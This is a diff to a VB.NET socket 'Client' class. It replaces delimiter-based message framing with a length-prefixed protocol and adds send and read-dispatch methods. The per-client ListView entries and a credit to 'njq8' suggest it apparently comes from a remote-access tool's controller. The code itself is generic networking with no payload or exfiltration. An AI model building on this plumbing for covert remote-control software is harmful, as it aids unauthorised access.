@@ -10,20 +10,21 @@ Imports System.Net.Sockets
 
 Public Class Client
 
-    Public IsConnected As Boolean = True
-    Public L As ListViewItem = Nothing
     Public C As Socket = Nothing
-    Public IP As String = Nothing
-    Public Buffer(1024 * 100) As Byte
+    Public IsConnected As Boolean = False
+    Public BufferLength As Long = Nothing
+    Public Buffer() As Byte = Nothing
     Public MS As MemoryStream = Nothing
-    ' Public Shared Event Read(ByVal C As Client, ByVal b() As Byte)
+    Public IP As String = Nothing
+    Public L As ListViewItem = Nothing
 
     Sub New(ByVal CL As Socket)
-        Me.C = CL
-
-        Me.Buffer = New Byte(1024 * 100) {}
-        Me.MS = New MemoryStream
-        Me.IP = CL.RemoteEndPoint.ToString
+        C = CL
+        IsConnected = True
+        BufferLength = -1
+        Buffer = New Byte(0) {}
+        MS = New MemoryStream
+        IP = CL.RemoteEndPoint.ToString
 
         C.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf BeginReceive), C)
     End Sub
@@ -33,28 +34,71 @@ Public Class Client
         Try
             Dim Received As Integer = C.EndReceive(ar)
             If Received > 0 Then
-                Await MS.WriteAsync(Buffer, 0, Received)
-re:
-                If BS(MS.ToArray).Contains(Settings.EOF) Then
-                    Dim A As Array = Await fx(MS.ToArray, Settings.EOF)
-                    '  RaiseEvent Read(Me, A(0))
-                    Threading.ThreadPool.QueueUserWorkItem(New Threading.WaitCallback(Sub() Messages.Read(Me, A(0))))
-                    Await MS.FlushAsync
-                    MS.Dispose()
-                    MS = New MemoryStream
+                If BufferLength = -1 Then
+                    If Buffer(0) = 0 Then
+                        BufferLength = BS(MS.ToArray)
+                        MS.Dispose()
+                        MS = New MemoryStream
 
-                    If A.Length = 2 Then
-                        MS.Write(A(1), 0, A(1).length)
-                        GoTo re
+                        If BufferLength = 0 Then
+                            BufferLength = -1
+                            C.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf BeginReceive), C)
+                        End If
+                        Buffer = New Byte(BufferLength - 1) {}
+                    Else
+                        MS.WriteByte(Buffer(0))
                     End If
-
+                Else
+                    Await MS.WriteAsync(Buffer, 0, Received)
+                    If (MS.Length = BufferLength) Then
+                        Threading.ThreadPool.QueueUserWorkItem(New Threading.WaitCallback(AddressOf BeginRead), MS.ToArray)
+                        BufferLength = -1
+                        MS.Dispose()
+                        MS = New MemoryStream
+                        Buffer = New Byte(0) {}
+                    Else
+                        Buffer = New Byte(BufferLength - MS.Length - 1) {}
+                    End If
                 End If
-            Else
-                isDisconnected()
             End If
             C.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf BeginReceive), C)
         Catch ex As Exception
             isDisconnected()
+        End Try
+    End Sub
+
+    Sub BeginRead(ByVal b As Byte())
+        Try
+            Messages.Read(Me, b)
+        Catch ex As Exception
+        End Try
+    End Sub
+
+    Sub Send(ByVal b As Byte())
+        Threading.ThreadPool.QueueUserWorkItem(New Threading.WaitCallback(AddressOf BeginSend), b)
+    End Sub
+
+    Async Sub BeginSend(ByVal b As Byte())
+        Try
+            Dim MS As New MemoryStream
+            Dim L As Byte() = SB(b.Length & CChar(vbNullChar))
+            Await MS.WriteAsync(L, 0, L.Length)
+            Await MS.WriteAsync(b, 0, b.Length)
+
+            C.Poll(-1, SelectMode.SelectWrite)
+            C.Send(MS.ToArray, 0, MS.Length, SocketFlags.None)
+
+            Await MS.FlushAsync
+            MS.Dispose()
+        Catch ex As Exception
+            isDisconnected()
+        End Try
+    End Sub
+
+    Sub EndSend(ByVal ar As IAsyncResult)
+        Try
+            C.EndSend(ar)
+        Catch ex As Exception
         End Try
     End Sub
 
@@ -90,27 +134,5 @@ re:
         End Try
 
     End Sub
-
-    Sub EndSend(ByVal ar As IAsyncResult)
-        Try
-            C.EndSend(ar)
-        Catch ex As Exception
-        End Try
-    End Sub
-
-    'Credit to njq8 / better wat to split
-    Async Function fx(ByVal b As Byte(), ByVal Word As String) As Threading.Tasks.Task(Of Array)
-        Dim a As New Collections.Generic.List(Of Byte())
-        Dim M As New MemoryStream
-        Dim MM As New MemoryStream
-        Dim T As String() = Split(BS(b), Word)
-        Await M.WriteAsync(b, 0, T(0).Length)
-        Await MM.WriteAsync(b, T(0).Length + Word.Length, b.Length - (T(0).Length + Word.Length))
-        a.Add(M.ToArray)
-        a.Add(MM.ToArray)
-        M.Dispose()
-        MM.Dispose()
-        Return a.ToArray
-    End Function
 
 End Class
